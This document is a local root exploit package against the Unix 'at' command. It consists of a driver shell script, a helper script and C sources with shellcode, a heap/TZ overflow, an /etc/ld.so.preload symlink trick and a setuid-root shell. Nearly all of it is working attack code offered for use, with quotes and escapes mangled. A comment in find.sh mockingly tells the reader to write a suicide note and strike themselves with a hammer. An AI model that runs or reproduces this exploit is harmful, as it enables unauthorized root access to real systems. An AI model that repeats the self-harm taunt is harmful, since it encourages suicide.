#!/bin/sh

function cleanup {
 rm -f run ~/attmp/bep bep.c ~/attmp/rooter.so
 rm -f rooter.c ~/attmp/suidshell run.c suidshell.c
 rm -fr /tmp/atexpl*/
}

function die {
 echo $1′ didn’t work.’
 echo ‘You may need to find another TZONE and SIZ for run.c’
 cleanup
 exit 1
}

function makerun {
 [ -d ~/attmp ] || mkdir ~/attmp || die ‘Making ~/attmp’
 sed -e ‘s,HOMEDIR,”$HOME”,’ < run.inp > run.c
 cc -pipe run.c -o run

}
[ -z $1 ]

function mainstuff {
 sed -e ‘s,HOME,$HOME,’ < bep.inp > bep.c
 cc -pipe bep.c -o ~/attmp/bep
 sed -e ‘s,HOME,$HOME,’ < rooter.inp > rooter.c
 cc -pipe -shared rooter.c -o ~/attmp/rooter.so -nostdlib
 sed -e ‘s,HOME,$HOME,’ < suidshell.inp > suidshell.c
 cc -pipe suidshell.c -o ~/attmp/suidshell
 ./run 2>/dev/null || die ‘Getting the shell to work’
 at 2> /dev/null
 [ -u ~/attmp/suidshell ] || die ‘Creating suidshell’
 ~/attmp/suidshell
 cleanup
 exit 0
}

function usage {
 echo $0 TZONE OFFSET
 exit 1
}

function testbep {
 cat > $1 <<EoF
#!/bin/sh
echo ‘Changing these lines:

#define DEFTZONE ‘NZ-CHAT’
#define SIZ 120

into

#define DEFTZONE ”$2”
#define SIZ ‘$3′

and now $0 should work to get root.’
cd /tmp
cd $PWD
export TMPDIR=/var/tmp
rm run
umask 0
sed
-e ‘s,HOMEDIR,”$HOME”,’
-e ‘s,define DEFTZONE ‘NZ-CHAT’,define DEFTZONE ”$2”,’
-e ‘s/define SIZ 120/define SIZ ‘$3’/’ < run.inp > run.c
cc -pipe run.c -o run
EoF

chmod +x $1
}

function recover_core {
 echo -n Noticed core file…
 chmod +r /tmp/atexpl*/core
 mv /tmp/atexpl*/core $PWD
 [ ! -e /tmp/atexpl*/core ] && [ -e $PWD/core ] &&
 echo recovered to $PWD. || echo but could not recover it.
}

umask 076
[ $# -ne 0 ] && [ $# -ne 2 ] && [ $# -ne 3 ] && usage
[ -z $HOME ] && export HOME=/var/tmp
[ -e ./run ] || makerun
[ $# -eq 0 ] && mainstuff
testbep $HOME/attmp/bep $1 $2 $3
./run $1 $2
[ -e /tmp/atexpl*/core ] && recover_core
rm -r /tmp/atexpl*

— find.sh —
#!/bin/sh
# This script can be used to help work out the correct values to use
# for the DEFTZONE and SIZ values.
# ltrace is your friend.
# free() and fdopen() are the interesting functions for this exploit.
# something like
# $ ltrace -e!execl -o /tmp/attrace ./run NZ-CHAT 120
# (if it gives No! prompt, press ^C and try again.)
# $ egreg -e ‘free|fdopen’ /tmp/attrace
# and see if the addresses match.

# Oh yeah… if the default settings don’t work, and you can’t work
# out how to get ./run to build, you almost definately won’t be able
# to work out how to find the correct values.
# And if you can get it to build, and still can’t get it to work, then
# it is possible that it is not vulnerable.

# But, if you need help in getting r00t on a machine you have a
# shell on, here is a step-by-step instruction list of what to do.
#
# 1) Turn off the computer monitor.
# 2) Get a piece of paper,a large hammer and a pen or marker.
# 3) Write the following 4 lines on the paper:
# I can’t go on being a stupid script kiddie.
# I have decided to kill myself.
# Please don’t be sad.
# The world will be a better place without me.
# 4) Close your eyes for 5 seconds and think about your life.
# 5) Open your eyes.
# 6) Pick up the hammer.
# 7) Hit yourself on the top of the head with the hammer, as hard as possible.
# 8) If you regain consciousness, goto 5.
# 9) Turn on the monitor and re-read these instructions.
# 10) Underneath what you wrote, write the following 2 lines:
# I am so stupid I can’t even follow simple instructions.
# The world will be a MUCH better place without me.
# 11) Goto 4.

umask 077
rm -f /var/tmp/a3133* /var/tmp/ta /tmp/ta.test /var/tmp/bleh
sed
-e ‘s,/etc,/tmp,g’
-e ‘s,spool,tmp//,g’
-e ‘s,warning: commands will be executed using /bin/sh,If you get a ‘No!’ on the next line exit with ^C,’
-e ‘s/at.deny/ta.test/g’
-e ‘s/at>/No!/g’
-e ‘s/at.deny/ta.test/g’
-e ‘s,//at,////,g’
-e ‘s,cron/atjobs,///////////,g’
-e ‘s,.SEQ,bleh,g’
< /usr/bin/at >/var/tmp/ta
chmod u+x /var/tmp/ta
echo > /tmp/ta.test
echo 31336 > /var/tmp/bleh
killall ta 2>/dev/null

— router.inp —
_init()
{
 if(!geteuid())
 {
  unlink(‘/etc/ld.so.preload’);
  chown(‘HOME/attmp/suidshell’,0,0);
  chmod(‘HOME/attmp/suidshell’,06711);
 }
 return 0;
}

— run.inp —

// (Oh yeah, doesn’t the ptrace fix for the kernel blow? Makes even
// legitimate debugging of uid changing processes a real pain. Would
// be nice to see a better fix for it.)

// Modifying these values in some manner may help with different
// versions of libs or /usr/bin/at

#define DEFTZONE ‘NZ-CHAT’
#define SIZ 120
#define HOME HOMEDIR’/attmp’

// 1 argument == don’t fork the rmdir() part and use argv[1] for TZONE
// 2 arguments == same as 1 arg but use argv[2] for DASIZ

#define TZONE (argc>=2?argv[1]:DEFTZONE)

char shellcodebase[]=
‘xebx1fx5ex89x76xaax31xc0x88x46x77x89x46’
‘xccxb0x0bx89xf3x8dx4exaax8dx56xccxcdx80’
‘x31xdbx89xd8x40xcdx80xe8xdcxffxffxff’
HOME’/bep’;

doit(int q,char *dir)
{
 int p;
 if(q!=1)p=1;
 else p=fork();
 if(p)
 {
  if(q>=2)execl(‘/var/tmp/ta’,’ta’,’10101010′,0);
  else execl(‘/usr/bin/at’,’at’,’10101010′,0);
  exit(1);
 }
 if(!q)
 {
  sleep(4);
  rmdir(dir);
 }
}

main(int argc,char **argv,char **env)
{
 int z0=0,v0=0xbfffbfff;
 int z1=0,v1=0xbffebffe;
 int l;
 int dasiz=SIZ;
 char dir[2560];
 char eep[500000];
 char beep[500000];
 char shellcode[50000];
 unsigned char *p;
 unsigned char lenrun;

 lenrun=strlen(HOME’/attmp/bep’);
 sprintf(shellcode,’%s%c%s’,shellcodebase);
 for(p=shellcode;*p;p++)
 {
  if(*p==0x77)*p=lenrun;
  else
  if(*p==0xaa)*p=lenrun+1;
  else
  if(*p==0xcc)*p=lenrun+5;
  else
  if(*p==0xbb)*p=lenrun+4;
 }
 if(argc==3) dasiz=strtoul(argv[2],0,0);
 umask(0);
 sprintf(dir,’/tmp/atexpl’);
 sprintf(eep,’rm -rf %s* /var/tmp/a3133* /var/tmp/ta /var/tmp/bleh’,dir);
 system(eep);
 if(argc>=2)
 {
  chmod(‘./find.sh’,500);
  system(‘./find.sh’);
  chmod(‘./find.sh’,400);
 }
 env[0]=0;
 memset(eep,0,50000);
 memset(eep,0x90,100000);
 
 for(l=2+(strlen(shellcode)+strlen(TZONE))%4;l<90000;l+=4)
 {
  eep[l+0]=0x50;
  eep[l+1]=0xf0;
  eep[l+2]=0xff;
  eep[l+3]=0xbf;
 }
 sprintf(beep,’ATTN=%s%s’,eep,shellcode);
 putenv(beep);

// The heap trick part.
 memset(eep,0,500000);
 strcpy(eep,’TZ=./’);
 if (dasiz)memset(&eep[strlen(eep)],’/’,dasiz);
 strcat(eep,TZONE);
 putenv(eep);
 // These values were worked out empirically,
 // and could probably be done alot better.
 // They usually work though, so who cares?
 // 1st part to some location in memory.
 while(strlen(dir)<240)strcat(dir,&v0);
 mkdir(dir,0777);
 chdir(dir);
 doit(argc,dir);
}

— suidshell.inp —
main()
{
 setreuid(0,0);
 setregid(0,0);
 unlink(‘HOME/attmp/suidshell’);
 execl(‘/bin/sh’,’woot’,0);
}

— bep.inp —
#define LINKTO ‘/etc/ld.so.preload’

die(char*s)
{
 printf(‘exploit failed: %sn’,s);
 exit(1);
}

main()
{
 int f;
 setregid(getuid(),getuid());
 setreuid(getuid(),getuid());
 chdir(‘/tmp’);
 f=fopen(‘/var/spool/at/.SEQ’,’w’);if(!f)die(‘can’t write to .SEQ’);
 fprintf(f,’31336n’);
 fclose(f);
 unlink(‘/var/spool/at/a313370000059f’);
 symlink(LINKTO,’/var/spool/at/a313370000059f’);
 system(‘/usr/bin/at -f /nonexistant 10101010′);
 chmod(LINKTO,0777);
 f=fopen(LINKTO,’w’);if(!f)die(‘no link made?’);
 fprintf(f,’HOME/attmp/rooter.son’);
 fclose(f);
 exit(0);
}’
